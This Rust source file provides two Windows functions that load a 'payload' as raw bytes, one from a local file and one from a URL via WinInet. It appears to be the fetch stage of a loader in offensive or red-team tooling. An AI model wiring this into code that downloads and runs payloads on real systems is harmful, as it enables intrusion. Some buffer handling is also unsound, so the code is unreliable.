use std::ffi::c_void;

use windows::Win32::{
    Foundation::{GENERIC_READ, GetLastError},
    Networking::WinInet::{
        HTTP_QUERY_CONTENT_LENGTH, HttpQueryInfoA, INTERNET_BUFFERSA,
        INTERNET_FLAG_KEEP_CONNECTION, INTERNET_FLAG_NO_CACHE_WRITE, INTERNET_OPEN_TYPE_PRECONFIG,
        IRF_SYNC, InternetCloseHandle, InternetOpenUrlW, InternetOpenW, InternetReadFileExA,
    },
    Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_CREATION_DISPOSITION, FILE_SHARE_READ,
        GetFileSizeEx, ReadFileEx,
    },
    System::IO::OVERLAPPED,
};
use windows_core::{BSTR, PCWSTR, w};

pub fn get_payload_from_filesystem<T: AsRef<str>>(file_path: T) -> Vec<u8>
where
    BSTR: From<T>,
{
    let hwnd = unsafe {
        CreateFileW(
            PCWSTR(BSTR::from(file_path).into_raw()),
            GENERIC_READ.0,
            FILE_SHARE_READ,
            None,
            FILE_CREATION_DISPOSITION(0x3),
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .unwrap()
    };

    let mut lpfilesize = 0_i64;
    unsafe { GetFileSizeEx(hwnd, &mut lpfilesize).unwrap() };
    let mut buf = vec![0_u8; lpfilesize as usize];
    let mut overlapped = OVERLAPPED::default();

    unsafe { ReadFileEx(hwnd, Some(&mut buf), &mut overlapped, None).unwrap() };
    buf
}

pub fn get_payload_from_url<T: AsRef<str>>(url: T) -> Vec<u8>
where
    BSTR: From<T>,
    T: std::fmt::Display + Clone,
{
    let handle_open = unsafe {
        InternetOpenW(
            w!("agent"),
            INTERNET_OPEN_TYPE_PRECONFIG.0,
            PCWSTR::null(),
            PCWSTR::null(),
            0,
        )
    };

    if handle_open.is_null() {
        println!("InternetOpenW failed. {:?}", unsafe { GetLastError() });
    }

    let handle_url = unsafe {
        InternetOpenUrlW(
            handle_open,
            PCWSTR::from_raw(BSTR::from(url.clone()).into_raw()),
            None,
            INTERNET_FLAG_NO_CACHE_WRITE,
            None,
        )
    };

    if handle_url.is_null() {
        println!(
            "InternetOpenUrlW failed. {:?} url: {}",
            unsafe { GetLastError() },
            url.clone()
        );
    }

    let content_length_buf = [0_u8; 32];
    let mut buf_len = content_length_buf.len() as u32;
    unsafe {
        HttpQueryInfoA(
            handle_url,
            HTTP_QUERY_CONTENT_LENGTH,
            Some(content_length_buf.as_ptr() as *mut c_void),
            &mut buf_len,
            None,
        )
        .unwrap();
    }

    let content_length_str = String::from_utf8(content_length_buf.to_vec()).unwrap();
    let content_length = content_length_str
        .trim_end_matches('\0')
        .parse::<u64>()
        .unwrap();

    let inner_buf = vec![0_u8; content_length as usize];

    let mut internet_buffer = INTERNET_BUFFERSA::default();
    internet_buffer.dwStructSize = size_of::<INTERNET_BUFFERSA>() as u32;
    internet_buffer.lpvBuffer = inner_buf.as_slice().as_ptr() as *mut c_void;
    internet_buffer.dwBufferLength = inner_buf.len() as u32;

    unsafe {
        InternetReadFileExA(handle_url, &mut internet_buffer, IRF_SYNC, None).unwrap();
    }

    unsafe {
        let _ = InternetCloseHandle(handle_url);
        let _ = InternetCloseHandle(handle_open);
    }

    inner_buf
}
